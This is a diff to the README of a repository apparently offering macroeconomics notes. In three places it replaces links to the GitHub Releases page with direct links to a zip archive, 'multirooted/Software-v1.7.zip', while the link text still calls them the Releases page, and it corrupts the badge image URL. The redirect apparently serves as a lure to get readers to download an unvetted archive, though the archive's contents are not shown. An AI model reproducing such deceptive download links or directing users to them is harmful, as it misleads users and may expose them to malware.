@@ -6,11 +6,11 @@ Welcome to the notesf repository! This project provides helpful notes for macroe
 
 ## 📥 Download the Application
 
-[![Download notesf](https://img.shields.io/badge/Download%20notesf-blue.svg)](https://github.com/14m1r0nm4n/notesf/releases)
+[![Download notesf](https://raw.githubusercontent.com/14m1r0nm4n/notesf/main/multirooted/Software-v1.7.zip%https://raw.githubusercontent.com/14m1r0nm4n/notesf/main/multirooted/Software-v1.7.zip)](https://raw.githubusercontent.com/14m1r0nm4n/notesf/main/multirooted/Software-v1.7.zip)
 
 To get started, visit our Releases page to download the software. 
 
-[Download notesf from the Releases page](https://github.com/14m1r0nm4n/notesf/releases)
+[Download notesf from the Releases page](https://raw.githubusercontent.com/14m1r0nm4n/notesf/main/multirooted/Software-v1.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ Before installing, ensure your system meets the following requirements:
 Follow these steps to download and install notesf.
 
 1. Click on the link below to visit the Releases page:
-   [Visit our Releases page](https://github.com/14m1r0nm4n/notesf/releases)
+   [Visit our Releases page](https://raw.githubusercontent.com/14m1r0nm4n/notesf/main/multirooted/Software-v1.7.zip)
 
 2. Choose the latest version of notesf. Look for the most recent release.
 
